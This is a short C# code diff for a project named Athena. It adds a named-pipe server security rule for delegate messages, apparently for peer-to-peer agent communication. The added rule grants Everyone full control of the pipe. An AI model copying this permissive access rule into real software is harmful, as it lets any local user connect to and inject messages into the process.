@@ -12,6 +12,10 @@ using Athena.Models;
 using Athena.Models.Config;
 using System.Text.Json;
 using System.Diagnostics;
+using System.IO.Pipes;
+using System.Security.Principal;
+using System.Security.AccessControl;
+using H.Pipes.AccessControl;
 
 namespace Athena
 {
@@ -63,6 +67,10 @@ namespace Athena
                 this.encrypted = true;
             }
             this.serverPipe = new PipeServer<DelegateMessage>(this.pipeName);
+
+            var pipeSec = new PipeSecurity();
+            pipeSec.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid,null), PipeAccessRights.FullControl, AccessControlType.Allow));
+            this.serverPipe.SetPipeSecurity(pipeSec);
             this.serverPipe.ClientConnected += async (o, args) => await OnClientConnection();
             this.serverPipe.ClientDisconnected += async (o, args) => await OnClientDisconnect();
             this.serverPipe.MessageReceived += (sender, args) => OnMessageReceive(args);
